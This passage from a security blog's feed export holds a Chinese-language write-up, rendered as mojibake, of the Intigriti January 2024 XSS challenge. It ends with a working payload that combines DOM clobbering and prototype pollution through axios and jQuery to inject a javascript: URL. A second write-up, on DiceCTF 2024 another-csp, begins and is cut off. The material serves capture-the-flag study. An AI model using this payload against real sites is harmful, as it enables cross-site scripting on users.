class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€™é‚Šçœ‹èµ·ä¾†å°±æ˜¯æˆ‘å€‘è¦æ‰¾çš„åœ°æ–¹äº†ï¼</p><p>åªè¦æ±¡æŸ“ <code>img.avatar </code>ï¼Œå°±å¯ä»¥æ§åˆ¶ <code>tokenCache</code> çš„å…§å®¹ï¼Œé€²è€Œå½±éŸ¿åˆ° tokenize çš„çµæœï¼Œç›´æ¥æŠŠçµæœæ›¿ä»£æˆæˆ‘å€‘è¦é¸çš„ iframeã€‚</p><p>çœ‹ä¾†é æœŸè§£æ³•ä¹Ÿæ²’é€™éº¼é›£å˜›ã€‚</p><p>ä½†å˜—è©¦éå¾Œï¼Œç™¼ç¾æ²’æœ‰ç”¨ã€‚</p><p>æ²’æœ‰ç”¨çš„åŸå› ä¸æ˜¯å› ç‚º gadget æ‰¾éŒ¯ï¼Œè€Œæ˜¯å› ç‚º prototype pollution çš„éƒ¨åˆ†ã€‚æ­¤æ™‚ï¼Œå°±è¢«é€¼å¾—å›é ­ç ”ç©¶ä¹‹å‰å·æ‡¶åªçœ‹ exploit çš„ axios æ¼æ´ã€‚</p><p>Axios åœ¨æŠŠ form çš„åç¨±è½‰æˆ JSON çš„ key æ™‚ï¼Œæ˜¯é€™æ¨£<a href="https://github.com/axios/axios/blob/v1.6.4/lib/helpers/formDataToJSON.js#L12">é‹ä½œ</a>çš„ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * It takes a string like `foo[x][y][z]` and returns an array like `['foo', 'x', 'y', 'z'] * * @param &#123;string&#125; name - The name of the property to get. * * @returns An array of strings. */</span><span class="token keyword">function</span> <span class="token function">parsePropPath</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// foo[x][y][z]</span>  <span class="token comment">// foo.x.y.z</span>  <span class="token comment">// foo-x-y-z</span>  <span class="token comment">// foo x y z</span>  <span class="token keyword">return</span> utils<span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\w+|\[(\w*)]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">match</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'[]'</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token operator">:</span> match<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">||</span> match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœƒæŠŠ A-Za-z0-9_ ä»¥å¤–çš„å­—å…ƒéƒ½ç•¶ä½œåˆ†éš”ç¬¦è™Ÿï¼Œå› æ­¤ç©ºç™½æ²’è¾¦æ³•æˆç‚ºå±¬æ€§åç¨±çš„ä¸€éƒ¨åˆ†ã€‚æˆ‘åœ¨é€™é‚ŠèŠ±äº†ä¸‰å››å€‹å°æ™‚ï¼Œæ²’æœ‰æ‰¾åˆ°ä»»ä½•å¯ä»¥ç¹éçš„æ–¹å¼ã€‚</p><p>æ­¤æ™‚æˆ‘çŸ¥é“æˆ‘éŒ¯äº†ï¼Œé€™é¡ŒçœŸçš„æ²’é€™éº¼ç°¡å–®â€¦</p><h2><span id="äººç”Ÿä¸‰å¤§éŒ¯è¦ºä¹‹ä¸€æˆ‘èƒ½è§£é–‹">äººç”Ÿä¸‰å¤§éŒ¯è¦ºä¹‹ä¸€ï¼šæˆ‘èƒ½è§£é–‹</span></h2><p>éäº†ä¸€å¤©ä»¥å¾Œï¼Œç¹¼çºŒçœ‹é€™é“é¡Œç›®ï¼Œæ—¢ç„¶æ²’è¾¦æ³•ç”¨ç©ºç™½ï¼Œé‚£æ‡‰è©²æ˜¯æœ‰å…¶ä»–åœ°æ–¹å¯ä»¥åˆ©ç”¨ï¼Œæ–¼æ˜¯å°±æ¥è‘—è¿½è¹¤ç¨‹å¼ç¢¼çš„é‹ä½œã€‚</p><p>ç¹¼çºŒä¸€ç›´å¾€ä¸‹è¿½çš„è©±ï¼Œæœƒè¿½åˆ° <a href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L1766">matcherFromTokens</a> é€™å€‹å‡½å¼ï¼Œä½†è£¡é¢çš„ç¨‹å¼ç¢¼ä¸€æ¨£åˆå¤šåˆè¤‡é›œï¼Œæ–¼æ˜¯æˆ‘ç¬¬ä¸€æ¬¡çœ‹åˆ°çš„æ™‚å€™å¿ƒè£¡æƒ³è‘—ï¼šã€Œç®—äº†å§ï¼Œé‚„æ˜¯ç­‰è§£ç­”å¥½äº†ã€ã€‚</p><p>ä½†éäº†ä¸€å¤©ä¹‹å¾Œé‡æŒ¯ç²¾ç¥ï¼Œå†æ¬¡å¾é ­é–‹å§‹çœ‹èµ·ï¼Œç™¼ç¾å…¶å¯¦åœ¨é€²å…¥ tokenize ä¹‹å‰ï¼Œå°±æœ‰ä¸€å€‹åœ°æ–¹å¯ä»¥æ±¡æŸ“äº†ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span> <span class="token parameter">selector<span class="token punctuation">,</span> context<span class="token punctuation">,</span> results<span class="token punctuation">,</span> seed</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> i<span class="token punctuation">,</span> tokens<span class="token punctuation">,</span> token<span class="token punctuation">,</span> type<span class="token punctuation">,</span> find<span class="token punctuation">,</span>    compiled <span class="token operator">=</span> <span class="token keyword">typeof</span> selector <span class="token operator">===</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> selector<span class="token punctuation">,</span>    match <span class="token operator">=</span> <span class="token operator">!</span>seed <span class="token operator">&amp;&amp;</span> <span class="token function">tokenize</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> selector <span class="token operator">=</span> compiled<span class="token punctuation">.</span>selector <span class="token operator">||</span> selector <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€™é‚Šæœ‰å€‹ <code>selector = compiled.selector || selector</code>ï¼Œé‚£åªè¦æ±¡æŸ“ <code>selector</code>ï¼Œæˆ‘ä¸å°±å¯ä»¥ä»»æ„æ›´æ”¹ selector äº†å—ï¼Ÿ</p><p>æ­£ç•¶æˆ‘ç‚ºè‡ªå·±çš„è°æ˜æ²¾æ²¾è‡ªå–œæ™‚ï¼Œç¾å¯¦é¦¬ä¸Šè·‘éä¾†æ‰“äº†æˆ‘ä¸€å·´æŒï¼Œæ±¡æŸ“äº† selector ä¹‹å¾Œï¼Œåœ¨é€²å…¥åˆ° tokenize æ™‚å‡ºéŒ¯äº†ï¼Œå› ç‚ºè£¡é¢æœ‰ä¸€æ®µæ˜¯ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Filters</span><span class="token keyword">for</span> <span class="token punctuation">(</span> type <span class="token keyword">in</span> filterMatchExpr <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span> match <span class="token operator">=</span> jQuery<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>match<span class="token punctuation">[</span> type <span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span> soFar <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token operator">!</span>preFilters<span class="token punctuation">[</span> type <span class="token punctuation">]</span> <span class="token operator">||</span>        <span class="token punctuation">(</span> match <span class="token operator">=</span> preFilters<span class="token punctuation">[</span> type <span class="token punctuation">]</span><span class="token punctuation">(</span> match <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        matched <span class="token operator">=</span> match<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tokens<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">value</span><span class="token operator">:</span> matched<span class="token punctuation">,</span>            <span class="token literal-property property">type</span><span class="token operator">:</span> type<span class="token punctuation">,</span>            <span class="token literal-property property">matches</span><span class="token operator">:</span> match        <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        soFar <span class="token operator">=</span> soFar<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span> matched<span class="token punctuation">.</span>length <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ç‚ºæ±¡æŸ“äº† selectorï¼Œæ‰€ä»¥åœ¨åŸ·è¡Œ <code>type in filterMatchExpr</code> çš„æ™‚å€™ï¼Œè¢«æ±¡æŸ“çš„ selector å°±æœƒè¢«å–å‡ºä¾†ï¼Œæ¥è‘—åŸ·è¡Œåˆ° <code>jQuery.expr.match[ type ].exec</code>ï¼Œç”±æ–¼å­—ä¸²ä¸¦æ²’æœ‰ exec é€™å€‹æ–¹æ³•ï¼Œæ‰€ä»¥å°±æœƒå ±éŒ¯ã€‚</p><p>ä¹Ÿå°±æ˜¯èªªï¼Œä¸ç®¡æˆ‘å€‘æ±¡æŸ“äº†ä»€éº¼ï¼Œåªè¦é€²å…¥åˆ° tokenize å°±æœƒå‡ºéŒ¯ï¼Œæ‰€ä»¥æƒ³è¦æŠŠ selector ç›´æ¥æ±¡æŸ“æˆ iframe æ˜¯è¾¦ä¸åˆ°çš„ã€‚</p><p>ä½†æ²’é—œä¿‚ï¼Œæˆ‘å€‘å¯ä»¥æŠŠ selector æ±¡æŸ“æˆä¹‹å‰å·²ç¶“åœ¨ cache è£¡é¢çš„æ±è¥¿ï¼Œä¾‹å¦‚èªª <code>img.loading</code>ï¼Œå°±å¯ä»¥ç¹é tokenizeã€‚</p><p>ä½†é€™ä¹Ÿåªæ˜¯ä¸è®“ç¨‹å¼å£æ‰è€Œå·²ï¼Œä¾èˆŠæ²’è¾¦æ³•æŠŠé¡Œç›®è§£é–‹ã€‚</p><h2><span id="é‚„æ˜¯å¾—é æç¤º">é‚„æ˜¯å¾—é æç¤º</span></h2><p>åˆéäº†ä¸€å…©å¤©ï¼Œçœ‹åˆ°äº†ä½œè€…åœ¨æ¨ç‰¹ä¸Šçš„<a href="https://twitter.com/kevin_mizu/status/1749740885657755842">æç¤º</a>ï¼Œç›´æ¥æ˜ç¢ºæŒ‡å‡ºé—œéµå°±åœ¨æ–¼æˆ‘ä¹‹å‰å› ç‚ºå¤ªè¤‡é›œæ‰€ä»¥ç•¥éçš„ addCombinatorï¼Œå¾æç¤ºä¸­å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ç¢ºå¯¦åªå·®æœ€å¾Œä¸€æ­¥äº†ã€‚</p><p>å› æ­¤åˆç¡¬è‘—é ­çš®èŠ±äº†åŠå¤©å·¦å³ï¼Œç¨å¾® trace äº†ä¸€ä¸‹é€™éƒ¨åˆ†çš„ç¨‹å¼ç¢¼ï¼Œæœ€å¾Œæ‰çµ‚æ–¼å¾—åˆ°é æœŸçš„ç­”æ¡ˆã€‚</p><p>å…ˆé™„ä¸Šæœ€å¾Œçš„ payloadï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>documentElement</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.owner.avatar_url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(document.domain)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.CLASS.a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.TAG.a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.dir<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parentNode<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.selector<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img.loading<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶å¯¦æœ€å¾Œä¸€éƒ¨åˆ† addCombinator é‚£é‚Šæœ‰é»åƒæ˜¯ä¸€åŠç”¨çŒœçš„ï¼Œä¸€åŠæ˜¯çœŸçš„çŸ¥é“ï¼Œå¤§æ¦‚å°±æ˜¯æŸä¸€å€‹éƒ¨åˆ†æœƒç”¨ <code>dir</code> ä¾†æ‰¾åŒ¹é…çš„å…ƒç´ ï¼Œè¨­å®šæˆ parentNode ä¹‹å¾Œå°±æœƒä¸€ç›´å¾€ä¸Šæ‰¾ï¼Œç„¶å¾Œå°±æœƒé…å°åˆ°æ•´å€‹ HTML çš„å…ƒç´ ï¼Œå› æ­¤å°±æœƒå¹«æ¯ä¸€å€‹ element éƒ½åŠ ä¸Š srcï¼Œè£¡é¢ç•¶ç„¶ä¹ŸåŒ…å«äº† iframeã€‚</p><p>ä½†æ¯ä¸€å€‹å‡½å¼çš„ç´°ç¯€æˆ‘å·²ç¶“å¿˜è¨˜äº†ï¼Œå› ç‚ºçœŸçš„æœ‰é»è¤‡é›œï¼Œå¦‚æœæœ‰èˆˆè¶£çŸ¥é“çš„è©±ï¼Œå¯ä»¥ç›´æ¥å»çœ‹åŸä½œè€…çš„ writeupï¼ˆåº•ä¸‹æœƒé™„ä¸Šé€£çµï¼‰ã€‚</p><h2><span id="å¾Œè¨˜">å¾Œè¨˜</span></h2><p>æˆ‘å¾ˆå–œæ­¡é€™é“é¡Œç›®é‚£ç¨®å¾ªåºæ¼¸é€²çš„æ„Ÿè¦ºï¼Œå¾ä¸€é–‹å§‹æ‰¾åˆ°éé æœŸè§£ä»¥ç‚ºå¾ˆç°¡å–®ï¼Œåˆ°å¾Œä¾†æ‰¾åˆ°ç¬¬ä¸€å€‹ cache çš„åœ°æ–¹ä»¥ç‚ºè§£é–‹äº†ï¼Œå»å›é ­ç™¼ç¾ axios çš„ prototype pollution æ²’è¾¦æ³•æ­é…ä½¿ç”¨ï¼Œæ¥è‘—æ‰¾åˆ°ç¬¬äºŒå€‹ <code>compiled.seletor</code> ä¹Ÿä»¥ç‚ºçµæŸäº†ï¼Œæ‰ç™¼ç¾å…¶å¯¦é‚„æ²’ã€‚</p><p>è¦ä¸€ç›´å†å¾€ä¸‹æ·±è¿½ï¼Œè¿½åˆ° addCombinatorï¼Œæ‰èƒ½ç¢ºå®šé€™ä¸€é¡Œæ˜¯çœŸçš„å¯ä»¥è§£é–‹ï¼Œèƒ½åœ¨ä¸€é“é¡Œç›®è£¡é¢æƒ…ç·’èµ·ä¼é€™éº¼å¤šæ¬¡ï¼Œä»£è¡¨é€™å€‹é¡Œç›®è¨­è¨ˆçš„å¾ˆå¥½ã€‚å¦ä¸€å€‹æˆ‘å¾ˆå–œæ­¡çš„é»æ˜¯é€™æ˜¯ä¸€é“é€¼è¿«ä½  code review çš„é¡Œç›®ï¼Œæ²’çœ‹ code çš„è©±æ˜¯çµ•å°è§£ä¸é–‹çš„ã€‚æˆ‘å¾ˆå–œæ­¡ code reviewï¼Œå› æ­¤ä¹Ÿå¾ˆå–œæ­¡é€™å€‹é¡Œç›®ã€‚</p><p>å¾ˆä½©æœä½œè€…èƒ½å¤ ç¹¼çºŒå¾€æ·±è™•æ¢ç´¢ï¼Œæ‰¾åˆ°é€™å€‹éå¸¸æœ‰è¶£çš„ç­”æ¡ˆï¼Œçµåˆäº† DOM clobbering è·Ÿ prototype pollutionï¼Œä¿®æ”¹äº† jQuery selector çš„æŒ‡å‘ï¼Œå‡ºäº†ä¸€é¡Œé€™éº¼å¥½ç©çš„é¡Œç›®ï¼</p><p>å†æ¬¡æ¨è–¦ä½œè€…æœ¬äººçš„ writeupï¼Œè·Ÿæˆ‘ç¶“æ­·äº†å·®ä¸å¤šçš„éç¨‹ï¼š<a href="https://mizu.re/post/intigriti-january-2024-xss-challenge">Intigriti January 2024 - XSS Challenge</a></p><p>é™¤æ­¤ä¹‹å¤–ï¼Œ@joaxcar æ‰¾åˆ°çš„å¦å¤–ä¸€å€‹éé æœŸè§£ä¹Ÿå¾ˆæœ‰è¶£ï¼Œæœ‰èˆˆè¶£çš„å¯ä»¥çœ‹çœ‹ï¼š<a href="https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/">Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge)</a></p><p>è‹¥æ˜¯å°æœ€ä¸€é–‹å§‹çš„é¡Œç›®æœ‰èˆˆè¶£ï¼Œä¹Ÿå¯ä»¥åƒè€ƒé€™é‚Šï¼š<a href="https://bugology.intigriti.io/intigriti-monthly-challenges/0124">https://bugology.intigriti.io/intigriti-monthly-challenges/0124</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸Šå€‹æœˆï¼ˆ2024 å¹´ 1 æœˆï¼‰çš„ Intigriti æŒ‘æˆ°éå¸¸æœ‰è¶£ï¼Œå‡ºé¡Œè€…æ˜¯ &lt;a href=&quot;https://twitter.com/kevin_mizu&quot;&gt;@kevin_mizu&lt;/a&gt;ï¼Œä¹‹å‰ä¹Ÿå¸¸åœ¨æ¨ç‰¹ä¸Šçœ‹åˆ°ä»–å‡ºä¸€äº› client-side ç›¸é—œçš„é¡Œç›®ï¼Œè€Œé€™æ¬¡çš„é¡Œç›®å“è³ªä¹Ÿä¸€å¦‚æ—¢å¾€çš„å¾ˆå¥½ï¼Œå€¼å¾—å¯«ä¸€ç¯‡ç´€éŒ„ã€‚&lt;/p&gt;
&lt;p&gt;é¡Œç›®çš„é€£çµåœ¨é€™é‚Šï¼Œæ²’æœ‰çœ‹éçš„è©±å¯ä»¥å…ˆå»çœ‹çœ‹ï¼š&lt;a href=&quot;https://challenge-0124.intigriti.io/&quot;&gt;https://challenge-0124.intigriti.io/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>DiceCTF 2024 ç­†è¨˜</title>
    <link href="https://blog.huli.tw/2024/02/12/dicectf-2024-writeup/"/>
    <id>https://blog.huli.tw/2024/02/12/dicectf-2024-writeup/</id>
    <published>2024-02-12T04:40:00.000Z</published>
    <updated>2024-02-12T06:24:06.669Z</updated>
    
    <content type="html"><![CDATA[<p>ç›¸æ¯”æ–¼<a href="https://blog.huli.tw/2023/03/26/dicectf-2023-writeup/">å»å¹´</a>è·Ÿ<a href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/">å‰å¹´</a>ï¼Œä»Šå¹´çš„ web é¡Œé›£åº¦æœ‰é¡¯è‘—é™ä½äº†ä¸å°‘ï¼Œè®Šå¾—æ›´å¹³æ˜“è¿‘äººäº†ï¼Œé è‘—éšŠå‹çš„åŠªåŠ›æ‹¿ä¸‹äº†ç¬¬ä¸€åï¼Œè€Œ web é¡Œä¹Ÿåªå‰©ä¸€é¡Œæ²’è§£å‡ºä¾†ã€‚</p><p>é€™æ¬¡æˆ‘åŸºæœ¬ä¸Šåªè§£äº†ç°¡å–®çš„ funnylogin è·Ÿé›£çš„ safestlistï¼Œå…¶ä»–éƒ½æ˜¯éšŠå‹è§£é–‹çš„ï¼Œé‚„æœ‰å¦ä¸€é¡Œ another-csp æœ‰çœ‹äº†ä¸€ä¸‹ï¼Œå› æ­¤é€™ç¯‡åªæœƒè¨˜æˆ‘æœ‰çœ‹éçš„ä»¥åŠæ¯”è¼ƒé›£çš„é¡Œç›®ã€‚</p><p>å¦‚æœæƒ³çœ‹å…¶ä»–é¡Œï¼Œå¯ä»¥åƒè€ƒå…¶ä»–äººçš„ writeupï¼š</p><ol><li><a href="https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003">st98 - DiceCTF 2024 Quals writeup</a></li><li><a href="https://one3147.tistory.com/77">0xOne - 2024 Dice CTF Write up [Web]</a></li></ol><p>å®˜æ–¹æä¾›çš„æ‰€æœ‰é¡Œç›®åŸå§‹ç¢¼ï¼š<a href="https://github.com/dicegang/dicectf-quals-2024-challenges">https://github.com/dicegang/dicectf-quals-2024-challenges</a></p><p>é—œéµå­—åˆ—è¡¨ï¼š</p><ol><li>crash chromium</li><li>slower css style</li><li>xsleak</li><li>URL length limit</li><li>service worker</li><li>background fetch</li><li>connection pool + css injection</li><li>iframe width + css inection</li></ol><span id="more"></span><h2><span id="webx2fanother-csp-16-solves">web&#x2F;another-csp (16 solves)</span></h2><p>é€™é¡Œçš„ç¨‹å¼ç¢¼æ»¿ç°¡å–®çš„ï¼Œç°¡åŒ–éå¾Œå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>another-csp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sandbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sandbox<span class="token punctuation">"</span></span> <span class="token attr-name">sandbox</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> code <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">const</span> token <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token string">'0'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> content <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;h1 data-token="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>token<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>token<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>code<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>srcdoc <span class="token operator">=</span> content<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½ å¯ä»¥æ’å…¥ä»»æ„ç¨‹å¼ç¢¼åˆ° iframe è£¡é¢ï¼Œç›®æ¨™æ˜¯å·åˆ°ç›¸åŒç¶²é ä¸‹çš„ tokenã€‚</p><p>è€Œé‡é»æ˜¯ iframe çš„ sandbox å…¨é–‹ï¼ŒCSP ä¹Ÿå°é–å¾—å¾ˆæ­»ã€‚å¾é€™å…©å€‹ç·šç´¢ä¸­ï¼Œå¯ä»¥å¾—å‡ºé™åˆ¶æ˜¯ï¼š</p><ol><li><code>defeault-src 